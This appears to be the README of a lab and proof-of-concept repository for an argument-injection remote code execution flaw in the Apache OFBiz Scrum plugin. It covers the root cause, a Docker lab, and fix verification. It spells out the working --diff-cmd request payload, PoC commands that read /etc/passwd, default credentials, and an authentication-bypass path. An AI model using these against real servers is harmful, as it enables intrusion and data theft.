# CVE-2025-54466: Apache OFBiz Scrum Plugin — SVN Argument Injection to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Overview

CVE-2025-54466 is a **Critical (CVSS 9.8)** Remote Code Execution vulnerability in the Apache OFBiz Scrum plugin. The `viewScrumRevision()` and `retrieveMissingScrumRevision()` methods in `ScrumServices.java` construct `svn` shell commands by directly concatenating user-controlled HTTP parameters into command strings passed to `Runtime.getRuntime().exec(String)`. An attacker can inject SVN command-line flags — specifically `--diff-cmd=<binary>` — to execute arbitrary commands on the server, with output returned directly in the HTTP response (in-band RCE).

## Affected Versions

| Software | Affected | Fixed |
|---|---|---|
| Apache OFBiz (with scrum plugin) | **All versions before 24.09.02** | 24.09.02 |

The scrum plugin (`ofbiz-plugins/scrum`) must be installed and loaded. It ships as part of the standard `ofbiz-plugins` repository.

## CVSS Score

| Source | Score | Severity | Vector |
|---|---|---|---|
| **NVD** | **9.8** | **CRITICAL** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| GHSA | 6.3 | MODERATE | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L` |

**CWE:** CWE-94 — Improper Control of Generation of Code (Code Injection)

---

## Root Cause

The root cause is **direct concatenation of unsanitized user input** into OS command strings. The `viewScrumRevision()` method in `ScrumServices.java` takes `repository` and `revision` parameters from the HTTP request and builds SVN command strings by simple string concatenation:

```java
String diffCommand = "svn diff -r" + (Integer.parseInt(revision.trim()) - 1)
    + ":" + revision + " " + repository;
Process diffProcess = Runtime.getRuntime().exec(diffCommand);
```

Java's `Runtime.exec(String)` does **not** invoke a shell — it tokenizes the command string by whitespace using `StringTokenizer` and passes the resulting tokens as `argv` to the OS. This prevents traditional shell metacharacter injection (`;`, `|`, `&&`), but enables **argument injection**: any whitespace-separated tokens in the `repository` parameter become additional command-line arguments to the `svn` binary.

The SVN client's `--diff-cmd=<program>` flag specifies an external program to execute when displaying file differences. By injecting this flag, an attacker causes SVN to invoke an arbitrary binary, achieving Remote Code Execution. The executed command's stdout is captured by SVN, returned to OFBiz, and rendered directly in the HTTP response body via the FreeMarker template (`<pre>${result.diffMessage}</pre>`), making this an **in-band RCE**.

---

## Lab Setup

### Prerequisites

- Docker Engine with Compose plugin (`docker compose`)
- ~4 GB disk space (Java build + OFBiz distribution)
- ~10 minutes for the first build (Gradle downloads dependencies)

### Build and Start

```bash
docker compose build
docker compose up -d
```

### Container Details

| Container | Role | Ports |
|---|---|---|
| `cve-2025-54466-vulnerable` | Apache OFBiz 24.09.01 with scrum plugin, SVN client, and local SVN repository | 8443 (HTTPS) |

The container includes:
- Apache OFBiz built from source at tag `release24.09.01` (vulnerable version)
- Subversion client (`svn`) installed for the vulnerable code path
- A local SVN repository at `file:///home/ofbiz/svnrepo` with 3 revisions and a working copy at `/home/ofbiz/svnwc`
- Demo data loaded with default credentials: `admin` / `ofbiz`

### Verify the Lab

```bash
# Check container health (wait for OFBiz to fully start — ~30-60 seconds)
docker compose ps

# Test OFBiz is running (HTTPS, self-signed cert)
curl -ks "https://localhost:8443/accounting/control/main"

# Test scrum plugin is loaded
curl -ks "https://localhost:8443/scrum/control/main"
```

### Stop and Clean Up

```bash
docker compose down
```

---

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector:

### Vector 1: RCE via `svn diff --diff-cmd` (Primary)

**Script:** `poc/poc.py`

Exploits the `svn diff` command on line 150-151 of `ScrumServices.java`. Injects `--diff-cmd=<script>` to execute arbitrary commands, with output returned in the `diffMessage` field of the HTTP response.

```bash
# Execute 'id' on the target
python3 poc/poc.py <target_host> <port> -c "id"

# Execute arbitrary commands
python3 poc/poc.py <target_host> <port> -c "whoami; uname -a"

# Read sensitive files
python3 poc/poc.py <target_host> <port> -c "cat /etc/passwd | head -5"
```

**Expected output:**
```
======================================================================
CVE-2025-54466: Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection
======================================================================
[*] Target: https://<target_host>:<port>
[*] Command: id

[*] Authenticating as 'admin' to https://<target_host>:<port>/scrum/control/login
[+] Authentication successful — session established

[*] Staging helper script at /tmp/.ofbiz_rce_helper.sh
[+] Helper script staged at /tmp/.ofbiz_rce_helper.sh

[*] Triggering SVN argument injection via viewScrumRevision()...
[*] Sending exploit to: /scrum/control/RevisionInfo
[*] Payload: repository=--diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc
[*] Resulting svn command: svn diff -r1:2 --diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc

======================================================================
[+] ✅ EXPLOIT SUCCESSFUL — Command output received in HTTP response:
======================================================================

uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)

======================================================================
[+] Demonstrated: Remote Code Execution as OFBiz service account
[+] Vector: SVN --diff-cmd argument injection via 'repository' parameter
[+] In-band output: Command output returned in HTTP response body
```

### Vector 2: RCE via `svn log --diff --diff-cmd`

**Script:** `poc/poc_vector2.py`

Exploits the `svn log` command on line 143-144 — a different injection point. Injects `--diff --diff-cmd=<script>` to achieve RCE via the log command's inline diff feature. Output appears in `logMessage`.

```bash
python3 poc/poc_vector2.py <target_host> <port> -c "id"
```

### Vector 3: Argument Injection Proof via `--xml`

**Script:** `poc/poc_vector3.py`

A non-destructive proof of argument injection. Injects `--xml` into the `svn log` command, causing the output format to change from plain text to XML. Demonstrates that user input controls SVN command-line flags without requiring RCE.

```bash
python3 poc/poc_vector3.py <target_host> <port>
```

---

## Verification: Vulnerable vs. Patched

### Vulnerable (OFBiz < 24.09.02)

```
Request:
  GET /scrum/control/RevisionInfo?revision=2&repository=--diff-cmd%3D/tmp/helper.sh%20/home/ofbiz/svnwc

Response (HTTP 200):
  <pre>uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)</pre>

Result: ✅ Command executed — RCE confirmed
```

### Patched (OFBiz >= 24.09.02)

```
Request:
  GET /scrum/control/RevisionInfo?revision=2&repository=--diff-cmd%3D/tmp/helper.sh%20/home/ofbiz/svnwc

Response (HTTP 200):
  <pre></pre>

Result: ✅ Injection blocked — repository rejected by UrlValidator, empty output returned
```

The fix adds `UtilValidate.isValidUrl(repository)` and `UtilValidate.isInteger(revision)` checks. The URL validator enforces `scheme://host/path` format, rejecting payloads that contain `--diff-cmd=` or other argument-like prefixes.

---

## Fix

**Commit:** [`ae0c279b`](https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09) (release24.09 branch)
**Author:** Nicolas Malin
**Date:** 2025-07-26

The fix applies three mitigations:

1. **Input Validation (Primary Defense):** Added `UtilValidate.isValidUrl(repository)` and `UtilValidate.isInteger(revision)` checks before command construction. `isValidUrl` delegates to Apache Commons `UrlValidator`, enforcing `scheme://host/path` format. Payloads like `--diff-cmd=/usr/bin/id file:///tmp/svnrepo` are rejected because they don't conform to valid URL syntax.

2. **Array-based `exec()` (Secondary Defense):** Changed from `Runtime.exec(String)` (whitespace-tokenized) to an array-based invocation. This prevents user input from being split into multiple arguments. (Note: the implementation actually calls `exec(String, String[])` treating the array as environment variables rather than the intended `exec(String[])`, but the input validation renders this moot.)

3. **Test Case:** Added `testViewScrumRevisionBadCall` that verifies injection payloads (e.g., `--diff+--diff-cmd=/bin/ls`) produce empty results.

**Assessment:** The fix is **complete and effective**. The `UrlValidator` check blocks all identified injection vectors. No bypass was found.

---

## Attack Surface & Authentication

### Vulnerable Endpoint

```
GET /scrum/control/RevisionInfo?revision=<integer>&repository=<payload>
```

### Authentication Paths

| Method | Requirement | Notes |
|---|---|---|
| **Demo credentials** | `admin` / `ofbiz` | Loaded from demo data; common in test/dev deployments |
| **View override bypass** | OFBiz < 18.12.16 | `GET /scrum/control/ListLocales/RevisionInfo?...` — unauthenticated |
| **Auth bypass chains** | Various older versions | CVE-2023-51467, CVE-2024-38856, CVE-2024-45195 |

### Injection Flow

```
HTTP Parameter:  repository = "--diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                                ↓
Java Code:       "svn diff -r1:2 " + repository
                 = "svn diff -r1:2 --diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                                ↓
Runtime.exec():  StringTokenizer splits by whitespace →
                 ["svn", "diff", "-r1:2", "--diff-cmd=/tmp/helper.sh", "/home/ofbiz/svnwc"]
                                ↓
SVN Client:      Executes /tmp/helper.sh as the external diff program
                                ↓
Output:          helper.sh stdout → captured by SVN → returned to Java → diffMessage
                 → rendered in HTTP response via <pre>${result.diffMessage}</pre>
```

---

## Known Issues

1. **OFBiz `file://` URL Bug:** OFBiz's `UtilHttp.canonicalizeParameterMap()` crashes with `IndexOutOfBoundsException` when HTTP parameter values contain `file://` URLs. The PoC uses the SVN working copy path (`/home/ofbiz/svnwc`) instead.

2. **SVN `--diff-cmd` Extra Arguments:** SVN passes additional arguments (`-u -L label1 -L label2 file1 file2`) to the diff-cmd binary. Most standard utilities fail with these unexpected arguments. The PoC uses a shell script wrapper that ignores SVN's extra arguments.

3. **OFBiz Startup Time:** OFBiz takes 30-60 seconds to fully initialize. The Docker healthcheck has a `start_period: 180s` to accommodate this. Wait for the container to report `healthy` before running the PoC.

4. **OFBiz Host Header Validation:** OFBiz rejects requests from unrecognized hosts. The container's entrypoint wrapper dynamically adds the container's IP addresses to `host-headers-allowed` in `security.properties`.

---

## References

| Resource | URL |
|---|---|
| **JIRA Issue** | https://issues.apache.org/jira/browse/OFBIZ-13276 |
| **GHSA Advisory** | https://github.com/advisories/GHSA-7vg9-49f9-pfxr |
| **Apache Mailing List** | https://lists.apache.org/thread/14d0yd9co9gx2mctd3vyz1cc8d39n915 |
| **Release Notes (24.09.02)** | https://ofbiz.apache.org/release-notes-24.09.02.html |
| **Fix Commit (release branch)** | https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09 |
| **Fix Commit (trunk)** | https://github.com/apache/ofbiz-plugins/commit/5a35b4f84f1314eed6bcdaca287e98a79b6ab1dd |
| **Apache Security Page** | https://ofbiz.apache.org/security.html |
| **oss-security** | http://www.openwall.com/lists/oss-security/2025/08/05/1 |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2025-54466 |

---

## Timeline

| Date | Event |
|---|---|
| 2025-07-26 | Fix committed to `release24.09` branch by Nicolas Malin |
| 2025-08-05 | Public disclosure on oss-security mailing list |
| 2025-08-15 | CVE-2025-54466 published on NVD |
| 2025-08-15 | Apache OFBiz 24.09.02 released with the fix |

---

## Files

| File | Purpose |
|------|---------|
| `README.md` | This writeup |
| `poc/poc.py` | Primary RCE PoC — `svn diff --diff-cmd` injection |
| `poc/poc_vector2.py` | RCE via `svn log --diff --diff-cmd` injection |
| `poc/poc_vector3.py` | Argument injection proof via `--xml` flag |
| `Dockerfile.vulnerable` | OFBiz 24.09.01 with scrum plugin and SVN client |
| `docker-compose.yml` | Single-container lab orchestration |
| `entrypoint-wrapper.sh` | Patches host-headers-allowed with container IPs |
| `intel_brief.md` | CVE intelligence from EIP |
| `vulnerability_analysis.md` | Root cause trace and fix assessment |
| `poc_verification_report.md` | Full test results for all 3 vectors |
| `lab_build_report.md` | Lab construction and verification details |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. The materials in this repository are intended to help defenders understand the vulnerability, verify their exposure, and validate that patches have been applied correctly.

**Do not** use this PoC against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent laws in other jurisdictions.

The authors assume no liability for misuse of this material. If you discover this vulnerability in a production system, follow responsible disclosure practices and notify the vendor.
